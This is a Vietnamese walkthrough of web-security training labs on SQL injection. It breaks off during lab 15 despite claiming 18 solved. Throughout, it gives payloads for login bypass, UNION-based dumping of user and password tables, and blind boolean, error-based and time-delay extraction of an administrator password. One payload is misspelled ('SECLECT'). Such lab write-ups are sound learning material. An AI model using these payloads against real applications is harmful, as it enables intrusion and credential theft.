 # Số bài giải được / Tổng số: 18/18
 # **1. Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
> Đề bài cho biết bài lab này có chứa lỗ hổng SQLi ở phẩn lọc danh mục sản phẩm, và cho biết cách hoạt động của truy vấn khi có yêu cầu từ người dùng. Yêu cầu chúng ta phải xem được 1 hoặc nhiều sản phẩm chưa được công khai của trang web để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/BJpTlNVg0.png)

>Truy cập trang web thì ta thấy có chỗ lọc sản phẩm theo danh mục: ![image](https://hackmd.io/_uploads/HJu0XVNxR.png)

>Thử ấn vào 1 danh mục, để ý rằng trang web xác định các dòng sản phẩm theo tham số `category` trong thanh URL, giá trị này có thể thay đổi tùy ý:![image](https://hackmd.io/_uploads/rJFK44NeC.png)

>Vì đề bài đã cho trước câu lệnh truy vấn: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` nên ta sẽ thử khai thác ở đây. Thử thêm dấu nháy đơn xem phần URL có khai thác được hay không `/filter?category=Lifestyle'`: ![image](https://hackmd.io/_uploads/r1JdrVNeR.png)


>Kết quả trả về lỗi, là do câu lệnh truy vấn bị sai cú pháp. Để thực hiện tấn công SQL injection, chúng ta chỉ cần thay đổi giá trị category kết hợp với một biểu thức logic luôn đúng sẽ dẫn tới hệ thống truy xuất tất cả sản phẩm trong cơ sở dữ liệu `/filter?category=Lifestyle' or 1=1--` : ![image](https://hackmd.io/_uploads/ByLEvVNxA.png)


# **2. Lab: SQL injection vulnerability allowing login bypass**
> Mô tả cho biết bài lab có chứa lỗ hổng SQLi ở chức năng đăng nhập. Nhiệm vụ của chúng ta là lợi dụng lỗ hổng đó và login thành công vào tài khoản của `administrator` để hoàn thành bài lab: 
![image](https://hackmd.io/_uploads/BJtouNNeA.png)

>Truy cập vào trang `/login` của bài lab: ![image](https://hackmd.io/_uploads/Sy8PYVVlA.png)

>Thử nhập ngẫu nhiên tài khoản và mật khẩu nhưng hiển thị thông báo lỗi: ![image](https://hackmd.io/_uploads/S1ZoFEVxC.png)

>Cùng nhìn lại 1 chút câu truy vấn tương ứng khi login: `SELECT * FROM users WHERE username = 'administrator' AND password = '123'` . Khi người dùng thực hiện đăng nhập, hai tham số username và password được truyền tới server, sau đó được “ghép” trực tiếp vào câu lệnh SQL. 

>Đề bài đã cho trước tài khoản, giờ ta phải tìm cách đăng nhập thành công chỉ dựa vào tài khoản. Ta có thể thay đổi giá trị khi nhập cho trường username, từ `administrator` thành `administrator' --`. Điều này sẽ dẫn tới phẩn truy vấn cho `password` bị comment lại và mất tác dụng. Kết quả là câu truy vấn gửi lên server sẽ chỉ là lấy thông tin từ cơ sở dữ liệu với một điều kiện duy nhất là `username = 'administrator'` mà thôi!! Và điều kiện này luôn đúng!
>![image](https://hackmd.io/_uploads/BJ112E4eR.png)

>Hoàn thành bài lab vì ta đã login thành công vào `administrator`
>![image](https://hackmd.io/_uploads/SkRqoNEg0.png)

# **3. Lab: SQL injection UNION attack, determining the number of columns returned by the query**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Nhiệm vụ của chúng ta là phải lợi dụng lỗ hổng này và tìm được số cột, sử dụng UNION:
![image](https://hackmd.io/_uploads/HJY_ZB4x0.png)

>Truy cập trang web và tiến hành thử lọc theo danh mục sản phẩm: ![image](https://hackmd.io/_uploads/BybeXS4gR.png)

>Ta thấy rằng giá trị `category=Pets` được truyền qua URL và sẽ được server hiển thị trên giao diện respone nếu nó được thực hiện thành công. Và giá trị này có thể thay đổi được. Kiểm tra lỗ hổng SQL injection bằng cách thay đổi giá trị `category='`, giao diện trả về error: ![image](https://hackmd.io/_uploads/rJBC7SElR.png)

>Đoán rằng lỗi xuất hiện là do câu lệnh bị sai cú pháp nên không thực hiện được và server không có phản hồi lại. Có thể kết luận rằng nó sẽ không lọc đầu vào mà trực tiếp ghép các giá trị mà ta trực tiếp nhập vào. Lúc này, sử dụng UNION để bắt đầu xác định số cột, trước tiên đoán có 1 cột: `/filter?category=Pets' UNION SELECT NULL--`: ![image](https://hackmd.io/_uploads/r1LyHHElR.png)

>Truy vấn không thực hiện được, tiếp tục tăng số cột lên 2: ![image](https://hackmd.io/_uploads/Hk6zSHEeA.png)

>Tăng số cột lên 3, và lần này thì truy vấn đã được thực thi thành công. Vậy xác định được trong bảng sản phẩm này gồm có 3 cột: ![image](https://hackmd.io/_uploads/H1VYSHEl0.png)

# **4. Lab: SQL injection UNION attack, finding a column containing text**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Nhiệm vụ của chúng ta là phải lợi dụng lỗ hổng này và tìm được số cột, sử dụng UNION, và xác định được kiểu dữ liệu của cột, và hiển thị được chuỗi ngẫu nhiên được giấu bên trong:
![image](https://hackmd.io/_uploads/Sk159H4gA.png)

>Truy cập trang web và tiến hành thử lọc theo danh mục sản phẩm:
![image](https://hackmd.io/_uploads/B1LviSVeA.png)

>Ta thấy rằng giá trị `category=Gifts` được truyền qua URL và sẽ được server hiển thị trên giao diện respone nếu nó được thực hiện thành công. Và giá trị này có thể thay đổi được. Kiểm tra lỗ hổng SQL injection bằng cách thay đổi giá trị `category='`, giao diện trả về error: ![image](https://hackmd.io/_uploads/B1U9iBNl0.png)

>Đoán rằng lỗi xuất hiện là do câu lệnh bị sai cú pháp nên không thực hiện được và server không có phản hồi lại. Có thể kết luận rằng nó sẽ không lọc đầu vào mà trực tiếp ghép các giá trị mà ta trực tiếp nhập vào. Lúc này, sử dụng UNION để bắt đầu xác định số cột. Và sau khi thử 3 lần thì ta xác định được bảng này có 3 cột: ![image](https://hackmd.io/_uploads/HJWRsrEeR.png)

>Tiếp theo, chúng ta cần xác định cột dữ liệu nào sẽ tương thích với kiểu dữ liệu chuỗi (string) để có thể hiển thị được chuỗi họ yêu cầu. Đầu tiên thử với cột thứ nhất, sử dụng payload: `/filter?category=Gifts' UNION SELECT 'test', NULL, NULL--`
>![image](https://hackmd.io/_uploads/SyRsnrEeA.png)

>Tức là kiểu dữ liệu ở cột 1 không phải là dạng string, thử tiếp với cột thứ 2: ![image](https://hackmd.io/_uploads/BJnWTr4lA.png)

>Oh! Truy vấn được thực thi rồi, tức là cột 2 có kiểu dữ liệu là string. Bây giờ chỉ cần thay chuỗi đề bài yêu cầu vào để solved bài lab vào cột 2 thôi: ![image](https://hackmd.io/_uploads/r168TrElA.png)

# **5. Lab: SQL injection UNION attack, retrieving data from other tables**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Nhiệm vụ của chúng ta là phải lợi dụng lỗ hổng này là kết hợp kiến thức của những lab trước. Cho sẵn 3 bảng tên `users` có 2 cột là `username` và `password`. Yêu cầu login vào tài khoản `administrator` để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/H19OprVxR.png)

>Truy cập trang web và tiến hành thử lọc theo danh mục sản phẩm:
![image](https://hackmd.io/_uploads/H1WPAr4eA.png)

>Ta thấy rằng giá trị `category=Lifestyle` được truyền qua URL và sẽ được server hiển thị trên giao diện respone nếu nó được thực hiện thành công. Và giá trị này có thể thay đổi được. Kiểm tra lỗ hổng SQL injection bằng cách thay đổi giá trị `category='`, giao diện trả về error:![image](https://hackmd.io/_uploads/HJnq0S4gC.png)

>Đoán rằng lỗi xuất hiện là do câu lệnh bị sai cú pháp nên không thực hiện được và server không có phản hồi lại. Có thể kết luận rằng nó sẽ không lọc đầu vào mà trực tiếp ghép các giá trị mà ta trực tiếp nhập vào. Lúc này, sử dụng UNION để bắt đầu xác định số cột. Và sau khi thử 2 lần thì ta xác định được bảng này có 2 cột: ![image](https://hackmd.io/_uploads/SkXZ18NlC.png)

>Lúc này chỉ việc thay đổi payload để lấy tất cả **username** và **password** từ bảng **users** thôi: `filter?category=Lifestyle' UNION SELECT username,password FROM users--` ![image](https://hackmd.io/_uploads/ry_C1UNeA.png)

>Lúc này ta đã lấy ra được tài khoản và mật khẩu của `administrator`. Việc còn lại chỉ là login và solved bài lab: ![image](https://hackmd.io/_uploads/HkPzxI4eA.png)

# **6. Lab: SQL injection UNION attack, retrieving multiple values in a single column**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Nhiệm vụ của chúng ta là phải lợi dụng lỗ hổng này là kết hợp kiến thức của những lab trước. Cho sẵn 3 bảng tên `users` có 2 cột là `username` và `password`. Yêu cầu login vào tài khoản `administrator` để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/HyKBlIVx0.png)

>Truy cập trang web và tiến hành thử lọc theo danh mục sản phẩm:![image](https://hackmd.io/_uploads/HyRChZreC.png)

>Ta thấy rằng giá trị `category=Lifestyle` được truyền qua URL và sẽ được server hiển thị trên giao diện respone nếu nó được thực hiện thành công. Và giá trị này có thể thay đổi được. Kiểm tra lỗ hổng SQL injection bằng cách thay đổi giá trị `category='`, giao diện trả về error:![image](https://hackmd.io/_uploads/r1gQG6ZBeA.png)

>Đoán rằng lỗi xuất hiện là do câu lệnh bị sai cú pháp nên không thực hiện được và server không có phản hồi lại. Có thể kết luận rằng nó sẽ không lọc đầu vào mà trực tiếp ghép các giá trị mà ta trực tiếp nhập vào. Lúc này, sử dụng UNION để bắt đầu xác định số cột. Và sau khi thử 2 lần thì ta xác định được bảng này có 2 cột:![image](https://hackmd.io/_uploads/SySHT-rx0.png)

>Lúc này chỉ việc thay đổi payload để lấy tất cả **password** từ bảng **users** thôi:
> `filter?category=Lifestyle' UNION SELECT null,password FROM users--` ![image](https://hackmd.io/_uploads/ryRca-rxA.png)

.>Thử hết 3 mật khẩu đã hiện ra và trong đó có 1 mật khẩu đúng cho `administrator`. Login thành công và solved bài lab: ![image](https://hackmd.io/_uploads/Bk-e0-Be0.png)

# **7. Lab: SQL injection attack, querying the database type and version on Oracle**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Nhiệm vụ của chúng ta là lợi dụng lỗ hổng đó để truy xuất ra được phiên bản của cơ sở dữ liệu Oracle
![image](https://hackmd.io/_uploads/Bk7ZlGHeC.png)

>Truy cập bài lab, thấy có phần lọc sản phẩm theo danh mục: ![image](https://hackmd.io/_uploads/r19OezBeR.png)

>Thử xem phần này có bị lỗi SQLi không: ![image](https://hackmd.io/_uploads/rkFQbGrlR.png)

>Xác định được phần này tồn tại lỗ hổng SQLi, đi tìm số cột trong bảng. Sử dụng **ORDER BY** để tìm được số cột, khi thử tới 3 thì xuất hiện lỗi: ![image](https://hackmd.io/_uploads/H1cUfMBxR.png)

>Xem cheat-sheet để biết được cách lấy phiên bản của cơ sở dữ liệu Oracle: ![image](https://hackmd.io/_uploads/S1ZgSzrxC.png)

>Cuối cùng là thay payload để có thể truy xuất ra phiên bản của nó, biết trong bảng có 2 cột:
>`' UNION SELECT banner,null FROM v$version--` . Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/rJuKBzHlA.png)

# **8. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Nhiệm vụ của chúng ta là lợi dụng lỗ hổng đó để truy xuất ra được kiểu và phiên bản của cơ sở dữ liệu MySQL và Microsoft
![image](https://hackmd.io/_uploads/Hk4P8MSgR.png)

>Truy cập bài lab, thấy có phần lọc sản phẩm theo danh mục: ![image](https://hackmd.io/_uploads/BJNjuGBeR.png)

>Thử xem phần này có bị lỗi SQLi không. Thử với payload:
> `' OR 1=1--`
> ![image](https://hackmd.io/_uploads/SJu4KMBxR.png)

>Nhưng bị lỗi do không đúng cú pháp, tra cheat-sheet thì phát hiện phần comment của MySQL phải chứa thêm dấu cách ở cuối: ![image](https://hackmd.io/_uploads/rkGKFGBl0.png)

> Và lên Google tra thì dấu cách tương ứng với dấu `+` khi thay thế trong URL:![image](https://hackmd.io/_uploads/Hk-ntMreR.png)

>Do đó, tiến hành đổi payload sang: `' OR 1=1--+` và thành công: ![image](https://hackmd.io/_uploads/HyYCKzBxA.png)

>Tiếp theo, xác định số cột bên trong bảng bằng **ORDER BY**, thử đến số cột bằng 3 thì bị lỗi: ![image](https://hackmd.io/_uploads/SJLQcMreR.png)

>Xác định có 2 cột trong bảng, dựa vào cheat-sheet để lấy được câu lệnh cần thiết đối với 2 hệ cơ sở dữ liệu: 
>![image](https://hackmd.io/_uploads/Hk1OcfSx0.png)

>Từ đó, payload sẽ là: `' SECLECT @@version,null--+` . Tiến hành thay đổi tham số trên URL và thành công solved bài lab: ![image](https://hackmd.io/_uploads/HJpzjGrgC.png)

# **9. Lab: SQL injection attack, listing the database contents on non-Oracle databases**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Trang web có chứa chức năng đăng nhập, và trong cơ sở dữ liệu có 1 bảng chứa `username` và `password`. Nhiệm vụ của ta là tìm được tên của bảng và tìm được số cột của bảng ấy, sau đó lấy ra được toàn bộ username và password trong bảng. Cuối cùng là đăng nhập vào tài khoản của `administrator` để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/ryUnofSe0.png)

> Truy cập bài lab, thấy có phần lọc sản phẩm theo danh mục:![image](https://hackmd.io/_uploads/ByYfpMBgC.png)

>Thử xem phần này có bị lỗi SQLi không. Thử với payload:
> `' OR 1=1--` 
> ![image](https://hackmd.io/_uploads/Hkh4pMSlR.png)

> Xác định được chỗ này có lỗi SQLi, tìm số cột dữ liệu trả về trong truy vấn, sử dụng payload
> `' UNION SELECT null--`: ![image](https://hackmd.io/_uploads/SJ0SyXBlC.png)

>Tiếp tục tăng số cột lên 2 và có phản hồi trả về: `' UNION SELECT null,null--` ![image](https://hackmd.io/_uploads/HJ6_ymBeR.png)

>Xác định được dữ liệu trả về có 2 cột, từ đó ta sẽ viết payload để truy xuất tên của tất cả các bảng trong database: `' UNION SELECT table_name,null FROM information_schema.columns--` ![image](https://hackmd.io/_uploads/SJW3xmHx0.png)

> Ctrl F để tìm xem những bảng nào có khả năng chứa thông tin của người dùng: ![image](https://hackmd.io/_uploads/SJfZZQrxR.png)

>Tìm được bảng `pg_user` có khả năng là đúng, ta sửa payload để có thể truy xuất ra tên của các cột trong bảng này:
> **`' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'pg_user'--`**
![image](https://hackmd.io/_uploads/rkSjZ7BxC.png)


> Trong bảng **pg_user** có chứa cột **usename** và **passwd** là cột chúng ta đang tìm kiếm. Truy xuất thông tin hai cột này, payload: **`/filter?category=' UNION SELECT usename,passwd FROM pg_user--`**
![image](https://hackmd.io/_uploads/HkiNGXHgA.png)


> Trong này không tồn tại thông tin của admin mà ta cần, ta lại thử tiếp với bảng khác: ![image](https://hackmd.io/_uploads/ByvkQmrl0.png)

>Trong bảng `users_qcucis` này chứa 2 cột là `username_emzobw` và `password_pmrzfw`, thử xem bên trong 2 cột này chứa gì, payload: 
>`' UNION SELECT username_emzobw,password_pmrzfw FROM users_qcucis--`

>Và trong bảng này đã chứa chính xác thông tin ta cần tìm: ![image](https://hackmd.io/_uploads/SkO3mXrlA.png)

>Cuối cùng là đăng nhập vào `administrator` và solved bài lab: ![image](https://hackmd.io/_uploads/HJJeVXBl0.png)


# **10. Lab: SQL injection attack, listing the database contents on Oracle**
>Đề bài cho biết bài lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Trang web có chứa chức năng đăng nhập, và trong cơ sở dữ liệu Oracle có 1 bảng chứa `username` và `password`. Nhiệm vụ của ta là tìm được tên của bảng và tìm được số cột của bảng ấy, sau đó lấy ra được toàn bộ username và password trong bảng. Cuối cùng là đăng nhập vào tài khoản của `administrator` để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/rkRPEXrxR.png)

> Truy cập bài lab, thấy có phần lọc sản phẩm theo danh mục:![image](https://hackmd.io/_uploads/ByYfpMBgC.png)

>Thử xem phần này có bị lỗi SQLi không. Thử với payload:
> `' OR 1=1--` 
> ![image](https://hackmd.io/_uploads/B15ryEBeR.png)


> Xác định được chỗ này có lỗi SQLi, tìm số cột dữ liệu trả về trong truy vấn, sử dụng payload
> `' UNION SELECT null--`: ![image](https://hackmd.io/_uploads/rJ8DyNSxC.png)

>Tiếp tục tăng số cột lên 2, 3, 4... nhưng đều hiển thị sai cú pháp và server không có phản hồi. Sau 1 hồi tìm hiểu thì phát hiện: trong Oracle, câu lệnh **SELECT** phải có mệnh đề **FROM**. Và ta có thể thêm bảng `dual` vào sau mệnh đề **FROM**: ![image](https://hackmd.io/_uploads/HykkxNrxR.png)


> Do đó, thay đổi payload thành: `' UNION SELECT null FROM dual--` và nếu gặp lỗi thì tiếp tục tăng số cột lên để thử. Đến lần thứ 2 thì xác định được dữ liệu trả về gồm 2 cột: ![image](https://hackmd.io/_uploads/r1oOgNBl0.png)

> Dựa vào cheat-sheet để biết được cú pháp trong Oracle. Sử dụng paylad để lấy tên tất cả các bảng:
> `' UNION SELECT table_name,null FROM all_tables--`
> ![image](https://hackmd.io/_uploads/r1TC-4Sl0.png)

>Sử dụng Ctrl F và tìm kiếm theo cụm từ `user` để tìm tất cả các bảng có liên quan đến user. Tìm thấy 1 bảng tên **"USERS_JVTMAA"** nghi ngờ có chứa thông tin cần tìm: ![image](https://hackmd.io/_uploads/SkzSmVSgA.png)

>Để lấy tất cả các cột có trong bảng trên, sử dụng payload: 
>`' UNION SELECT column\_name,null FROM all\_tab\_columns WHERE table\_name='USERS_JVTMAA'--`
>![image](https://hackmd.io/_uploads/HkfKEEHgC.png)

> Thấy có 2 cột username và password, ta sẽ truy vấn xem bên trong 2 cột này có gì, sử dụng payload: 
> `' UNION SELECT USERNAME_ZOSAZC,PASSWORD_LHWDVU FROM USERS_JVTMAA--`
> ![image](https://hackmd.io/_uploads/S1ruH4rgR.png)

>Thành công lấy được mật khẩu của `administrator`. Việc còn lại là đăng nhập và solved bài lab:![image](https://hackmd.io/_uploads/Sk-iHVrgA.png)

# **11. Lab: Blind SQL injection with conditional responses**
> Mô tả cho biết trong lab này có chứa 1 lỗ hổng blind SQLi. Server sẽ sử dụng `tracking cookie` để phân tích và thực hiện truy vấn SQL chứa giá trị của cookie đã gửi. Nếu câu truy vấn không được thực hiện thì sẽ không có gì xảy ra, ngược lại nếu thành công thì 1 dòng thông báo "Welcome back" sẽ hiện ra. Biết có 1 bảng là `users` chứa 2 cột `username` và `password`. Nhiệm vụ của chúng ta là phải tìm được mật khẩu của `administrator` và đăng nhập để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/SyDCINHl0.png)

> Đây là dạng bài Blind SQLi sử dụng Boolean-based để lấy được tài khoản `administrator`. Lỗ hổng nằm ở cookie **"TrackingID"**.

>Khi thêm dấu ' vào trường TrackingID, ta nhận thấy không có gì xảy ra:
![image](https://hackmd.io/_uploads/BkR1C9Bl0.png)

>Nhưng khi dùng payload `' OR 1=1--` vào sau TrackingID, thì dòng chữ `Welcome back!` sẽ xuất hiện. Suy ra rằng, nếu truy vấn được thực hiện thì sẽ có dòng chữ này hiện lên: ![image](https://hackmd.io/_uploads/HJ_oR9reR.png)

> Đề bài đã cho biết tồn tại `username=administrator` nằm trong bảng `users`. Lúc này ta sẽ đi đoán mật khẩu sẽ gồm bao nhiêu kí tự! Sử dụng payload: `' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=§§--` . Với §§ ta cho vào Intruder chạy từ 1 -> 50. Quan sát respone trả về: ![image](https://hackmd.io/_uploads/Bkr0sGIg0.png)

> Thấy khi payload = 20 thì có độ dài của respone trả về là khác biệt duy nhất với đa số. Vậy có thể kết luận `password` gồm 20 kí tự. Tiếp tục ta sẽ đi đoán từng kí tự của mật khẩu này. Trong SQL có 1 hàm là SUBSTRING(x,y,z).
> Trong đó, `x` là giá trị muốn lấy ra xâu con, `y` là vị trí bắt đầu, `z` là lấy đi bao nhiêu kí từ bắt đầu từ y. Ta sẽ sử dụng nó để so sánh từng kí tự trong mật khẩu đúng với "26 kí tự latinh + 10 chữ số". Khi nào hiện `Welcome back!` thì kí tự đó là đúng! Sử dụng payload: 
> `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§§'--`
> Trong đó `§§` sẽ brute-force "26 kí tự latinh + 10 chữ số". ![image](https://hackmd.io/_uploads/SkRQRzLl0.png)

>Cài đặt payload: ![image](https://hackmd.io/_uploads/BJESRMIx0.png)

> Bắt đầu attack thử với kí tự đầu tiên trong mật khẩu đúng: ![image](https://hackmd.io/_uploads/SyKYCfIg0.png)

>Thấy kí tự 'a' có độ dài là khác nhất => chữ cái đầu tiên là "a"

>Lúc này thử chạy bằng tay hết 20 lần thì hơi mất thời gian, ta sẽ đặt thêm payload trong SUBSTRING: 
>`' AND (SELECT SUBSTRING(password,§§,1) FROM users WHERE username='administrator')='§§'--`

>Cài đặt tham số chạy cho payload:
> ![image](https://hackmd.io/_uploads/Sy7Y1X8gA.png)
>![image](https://hackmd.io/_uploads/SJ1qk78eR.png)

>Chọn kiểu Cluster Bomb và Attack: ![image](https://hackmd.io/_uploads/SkGCk7LxA.png)

> Sort theo Length và ta thu được từng kí tự trong mật khẩu: ![image](https://hackmd.io/_uploads/ByhkeQUeA.png)

>Sắp xếp lại thứ tự và thu được: ![image](https://hackmd.io/_uploads/HkPIlX8e0.png)

>Thử đăng nhập vào `administrator` và solved bài lab: ![image](https://hackmd.io/_uploads/BJD_eQUl0.png)

# **12. Lab: Blind SQL injection with conditional errors**
>Bài lab cũng thuộc dạng Blind, nhưng lần này nó sẽ không sử dụng Boolean-based nữa mà dùng Error-based
![image](https://hackmd.io/_uploads/S10Uj7IxA.png)

>Bắt request cho vào Repeater và đi khai thác vào `Tracking Cookie` : ![image](https://hackmd.io/_uploads/SJvWTmIl0.png)

>Thử thêm `' OR 1=1--` : ![image](https://hackmd.io/_uploads/BJGBTmLx0.png)

>Thấy server vấn phản hồi lại, nhưng khi thêm chỉ dấu nháy đơn " ' " vào thì lại lỗi: ![image](https://hackmd.io/_uploads/BkQA6m8e0.png)

>Chứng tỏ phần này đang bị SQLi, ta có thể khai thác. Thử xem có bao nhiêu cột được trả về trong dữ liệu: `' union select null--` , nhưng vẫn hiển thị lỗi: ![image](https://hackmd.io/_uploads/HJWB07LeA.png)

>Tiếp tục tăng số cột lên 2, 3, 4... đều không có kết quả... Tại sao lại xảy ra lỗi cú pháp, nghi ngờ rằng web này không sử dụng db MySQL, thử chuyển sang Oracle xem. Hệ cơ sở dữ liệu này bắt buộc phải có FROM trong mỗi câu truy vấn. Thay đồi payload thanh: `' union select null from dual--` : ![image](https://hackmd.io/_uploads/Sk-yyV8e0.png)

>Lần này đã có kết quả đúng trả về, và còn biết thêm rằng dữ liệu trả về chứa 1 cột. Tiếp theo ta đi xác định kiểu dữ liệu trả về. Khi payload là: `' union select 1 from dual--` thì sẽ lỗi: ![image](https://hackmd.io/_uploads/Hk8ugVUeC.png)

>Nhưng khi là `' union select 'test' from dual--` thì sẽ trả về đúng: ![image](https://hackmd.io/_uploads/r1wigEIgR.png)

>Kết luận rằng kiểu dữ liệu trả về thuộc loại string! Dựa vào các phân tích ở trên, có thể thấy server đã thực thi được phần injection của mình. Bây giờ ta sẽ đi tìm `password` cho user `administrator` có trong bảng `users` bằng phương pháp Error-based. Cụ thể với payload:
`' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual--`

>Có thể thấy rằng, khi điều kiện trong `WHEN` đúng thì nó sẽ thực hiện hàm `TO_CHAR(1/0)`, nhưng do 1/0 là lỗi nên server sẽ trả về lỗi:![image](https://hackmd.io/_uploads/rkFa7V8g0.png)

>Và khi điều kiện bên trong `WHEN` sai thì server sẽ không xảy ra lỗi do không thực hiện gì cả: ![image](https://hackmd.io/_uploads/Hk0PN4Lg0.png)

>Suy tiếp ra được, ta có thể đoán các điều kiện đúng của `password`. Gửi request tới Intruder, sử dụng payload: 
>`' UNION SELECT CASE WHEN (LENGTH(password)=§§) THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator'--` . Trong đó `§§`chạy từ 1 tới 50 và attack: ![image](https://hackmd.io/_uploads/HJGcS4UxC.png)

>Quan sát thấy khi payload = 20 thì server sẽ có phản hồi => Độ dài `password` là 20 kí tự. Tiếp tục đoán từng kí tự trong này bằng SUBSTR (đối với Oracle, sử dụng payload: 
>`' UNION SELECT CASE WHEN ((SUBSTR(password, §§, 1))='§§') THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator'--`

>Cài đặt tham số chạy cho payload: 
>![image](https://hackmd.io/_uploads/Sy7Y1X8gA.png)
>![image](https://hackmd.io/_uploads/SJ1qk78eR.png)

> Chọn kiểu Cluster Bomb và Attack. Tiếp tục sort theo mã trạng thái trả về để lọc ra những lần truy vấn thành công: ![image](https://hackmd.io/_uploads/SJiHd4LeR.png)

>Sắp xếp lại theo thứ tự: ![image](https://hackmd.io/_uploads/r1phO4UlA.png)

>Login và solved bài lab: ![image](https://hackmd.io/_uploads/HJAT_VUlR.png)

# **13. Lab: Visible error-based SQL injection**
> Bài này lại tiếp tục dùng `Tracking cookie`, kết quả của truy vấn sẽ không hiển thị ra. Nhiệm vụ của chúng ta là tìm được mật khẩu của `administrator` để solve lab:
![image](https://hackmd.io/_uploads/H1UhoEIg0.png)

>Bắt request vào Repeater thử thêm `' OR 1=1--'` vào sau Tracking cookie thì server có phản hồi: ![image](https://hackmd.io/_uploads/H1uoa48xA.png)

>Nhưng khi chỉ thêm dấu nháy đơn thì xuất hiện lỗi: ![image](https://hackmd.io/_uploads/ryLaa4UxC.png)

>Thay vì báo lỗi 500 thì server lại hiển thị cả error tại sao truy vấn không thực thi được!

> Tìm số cột mà dữ liệu trả về, sử dụng payload: 
> `' union select null--`
> ![image](https://hackmd.io/_uploads/Byh90EIxC.png)

>Từ đây biết được rằng hệ cơ sở dữ liệu của trang web là MySQL và dữ liệu trả về gồm 1 cột... Lại tiếp tục thử nó là kiểu dữ liệu gì: ![image](https://hackmd.io/_uploads/SktdJS8xA.png)
> ![image](https://hackmd.io/_uploads/S1cckrLx0.png)

> Biết được thêm nó là kiểu string. Giờ ta sẽ đi tìm `password` cho `administrator`. Dùng payload `' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END--` từ bài trên nhưng kết quả không khả quan: ![image](https://hackmd.io/_uploads/BJn_1D8eR.png)

> Gợi ý của đề bài cho ta dùng hàm **CAST()** trong SQL. Hàm này có tác dụng chuyển cột được chọn sang định dạng dữ liệu khác. Cú pháp như sau: 
> `CAST((SELECT username FROM users) AS int)`

>Từ đó, ta sẽ viết lại payload để khai thác lỗi trong lab này: 
>`'|| CAST((SELECT username FROM users) AS int)--`
> Payload này sẽ lấy ra tất cả username và chuyển nó về dạng chuỗi: ![image](https://hackmd.io/_uploads/BkLmbD8xA.png)

>Thông báo lỗi trả về là do có nhiều hơn 1 hàng được trả về. Sửa lại payload thành: 
> `'|| CAST((SELECT username FROM users limit 1) AS int)--` 
![image](https://hackmd.io/_uploads/H14hbD8eR.png)

>Lỗi nói rằng cột này không thể chuyển về dạng INT do nãy ta tìm được nó ở dạng string... Nhưng có thêm 1 thông tin khá quan trọng rằng username trong hàng đầu tiên của db là `administrator`. Tiếp tục, ta sử dụng payload để lấy mật khẩu ra: 
>`'|| CAST((SELECT password FROM users limit 1) AS int)--` 

>Thông báo lỗi đã hiển thị ra ngay `password` của `administrator`: ![image](https://hackmd.io/_uploads/H1l6zv8lA.png)

>Login để hoàn thành bài lab: ![image](https://hackmd.io/_uploads/SJUk7vLe0.png)

# **14. Lab: Blind SQL injection with time delays**
> Mô tả cho biết rằng tồn tại SQLi khi server dùng `Tracking cookie` khi thực hiện truy vấn. Kết quả khi truy vấn sẽ không hiển thị, kể cả khi có lỗi. Tuy nhiên, khi truy vấn được thực thi thì có thể dựa vào thời gian phản hồi để khai thác thông tin. Nhiệm vụ của chúng ta là khai thác lỗ hổng này để gây ra độ trễ 10 giây.
![image](https://hackmd.io/_uploads/rJp-QPLeA.png)
     
>Trước tiên, dựa vào cheat-sheet, đi tìm hệ cơ sở dữ liệu mà trang web sử dụng, dựa trên Time-base: ![image](https://hackmd.io/_uploads/SyGMvw8gA.png)

>Thử tới khi sử dụng payload pg_sleep(10) của PostgreSQL thì solved bài lab. Payload: `'||pg_sleep(10)--`
> ![image](https://hackmd.io/_uploads/rkR6iw8e0.png)

# **15. Lab: Blind SQL injection with time delays and information retrieval**
> Mô tả cho biết rằng tồn tại SQLi khi server dùng `Tracking cookie` khi thực hiện truy vấn. Kết quả khi truy vấn sẽ không hiển thị, kể cả khi có lỗi. Tuy nhiên, khi truy vấn được thực thi thì có thể dựa vào thời gian phản hồi để khai thác thông tin. Nhiệm vụ của chúng ta là lợi dụng lỗ hổng này để login được vào tài khoản `administrator` để hoàn thành bài lab:
![image](https://hackmd.io/_uploads/B1N82DIxC.png)

>Trước tiên phải xác định web này sử dụng hệ cơ sở dữ liệu gì. Dùng cheat-sheet để có các cú pháp time delay khác nhau:![image](https://hackmd.io/_uploads/Hk6ApDUlR.png)

>Thử tới payload `'||pg_sleep(10)--` thì xác định được bài này dùng PostgreSQL vì phản hồi bị chậm lại 10 giây: ![image](https://hackmd.io/_uploads/By2ZRPUe0.png)

>Sau đó mình sẽ đưa các truy vấn cần thiết vào trong **CASE**, để khi nào truy vấn đúng thì kết quả trả về ngay lập tức, còn sai thì delay 10 giây. Payload mẫu:
>`'|| CASE WHEN (1=1) THEN '' ELSE pg_sleep(10) END--`

>Tìm độ dài của password, sử dụng Intruder, payload:
